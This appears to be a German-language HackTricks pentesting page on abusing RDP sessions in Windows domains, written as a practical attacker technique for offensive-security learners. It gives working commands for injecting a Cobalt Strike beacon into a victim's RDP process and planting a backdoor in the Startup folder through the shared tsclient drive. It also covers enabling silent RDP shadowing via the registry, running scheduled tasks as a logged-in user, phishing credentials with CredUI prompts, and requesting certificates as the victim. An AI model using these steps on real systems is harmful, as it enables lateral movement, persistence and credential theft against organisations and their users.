# Missbrauch von RDP-Sitzungen

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Wenn die **externe Gruppe** **RDP-Zugriff** auf einen beliebigen **Computer** in der aktuellen Domäne hat, könnte ein **Angreifer** diesen **Computer kompromittieren und auf ihn warten**.

Sobald dieser Benutzer über RDP darauf zugegriffen hat, kann der **Angreifer zu der Sitzung dieses Benutzers pivotieren** und dessen Berechtigungen in der externen Domäne missbrauchen.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Prüfe **andere Möglichkeiten, Sessions mit anderen Tools zu stehlen** [**auf dieser Seite.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Wenn ein Benutzer per **RDP auf einen Computer zugreift**, auf dem ein **Angreifer** bereits **auf ihn wartet**, kann der Angreifer **einen Beacon in die RDP-Session des Benutzers injizieren**. Wenn das **Opfer beim Zugriff per RDP sein Laufwerk eingebunden** hat, könnte der **Angreifer darauf zugreifen**.

In diesem Fall könntest du einfach den **ursprünglichen Computer des Opfers kompromittieren**, indem du eine **Backdoor** im **Startup-Ordner** platzierst.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Wenn du **local admin** auf einem Host bist, auf dem das Opfer bereits eine **aktive RDP-Sitzung** hat, kannst du möglicherweise **diesen Desktop anzeigen/steuern, ohne das Passwort zu stehlen oder LSASS zu dumpen**.<sup>[[1]](#references)</sup>

Dies hängt von der Richtlinie für **Remote Desktop Services shadowing** ab, die hier gespeichert ist:<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Interessante Werte:

- `0`: Deaktiviert
- `1`: `EnableInputNotify` (Steuerung, Benutzerbestätigung erforderlich)
- `2`: `EnableInputNoNotify` (Steuerung, **keine Benutzerbestätigung**)
- `3`: `EnableNoInputNotify` (Nur-Anzeige, Benutzerbestätigung erforderlich)
- `4`: `EnableNoInputNoNotify` (Nur-Anzeige, **keine Benutzerbestätigung**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Dies ist besonders nützlich, wenn ein privilegierter Benutzer, der über RDP verbunden war, einen nicht gesperrten Desktop, eine KeePass-Sitzung, eine MMC-Konsole, eine Browsersitzung oder eine geöffnete Admin-Shell hinterlassen hat.

## Geplante Tasks als angemeldeter Benutzer

Wenn du **local admin** bist und der Zielbenutzer **aktuell angemeldet** ist, kann der Task Scheduler Code **als dieser Benutzer ohne dessen Passwort** starten.<sup>[[1]](#references)[[4]](#references)</sup>

Dadurch wird die vorhandene Logon-Sitzung des Opfers zu einem Ausführungsprimitive:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Hinweise:

- Wenn der Benutzer **nicht angemeldet** ist, benötigt Windows normalerweise das Passwort, um eine task zu erstellen, die als dieser Benutzer ausgeführt wird.
- Wenn der Benutzer **angemeldet** ist, kann die task den bestehenden Anmeldekontext wiederverwenden.
- Dies ist eine praktische Möglichkeit, GUI-Aktionen auszuführen oder Binaries innerhalb der Session des Opfers zu starten, ohne LSASS anzufassen.

## CredUI Prompt Abuse From the Victim Session

Sobald du **innerhalb des interaktiven Desktops des Opfers** Code ausführen kannst (zum Beispiel über **Shadow RDP** oder eine **als dieser Benutzer ausgeführte Scheduled Task**), kannst du mithilfe der CredUI-APIs eine **echte Windows-Anmeldedatenabfrage** anzeigen und die vom Opfer eingegebenen Credentials abgreifen.<sup>[[1]](#references)</sup>

Relevante APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typischer Ablauf:

1. Starte ein Binary in der Session des Opfers.
2. Zeige eine Aufforderung zur Domänenauthentifizierung an, die dem Branding der aktuellen Domäne entspricht.
3. Entpacke den zurückgegebenen Authentifizierungsbuffer.
4. Validiere die bereitgestellten Credentials und fordere optional weiterhin Eingaben an, bis gültige Credentials eingegeben werden.

Dies ist für **On-Host-Phishing** nützlich, da die Aufforderung von standardmäßigen Windows-APIs anstelle eines gefälschten HTML-Formulars dargestellt wird.

## Requesting a PFX In the Victim Context

Dasselbe Primitive **Scheduled-Task-as-User** kann verwendet werden, um ein **Certificate/PFX als der angemeldete Benutzer** anzufordern. Dieses Certificate kann später für die **AD-Authentifizierung** als dieser Benutzer verwendet werden, wodurch Passwortdiebstahl vollständig vermieden wird.<sup>[[1]](#references)[[5]](#references)</sup>

High-Level-Ablauf:

1. Erlange **local admin** auf einem Host, auf dem das Opfer angemeldet ist.
2. Führe Enrollment-/Export-Logik als das Opfer mithilfe einer **Scheduled Task** aus.
3. Exportiere das resultierende **PFX**.
4. Verwende das PFX für PKINIT / Certificate-basierte AD-Authentifizierung.

Siehe die AD CS-Seiten für weiterführenden Abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - Von flachen Netzwerken zu gesicherten Domänen mit Tiering-Modellen](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
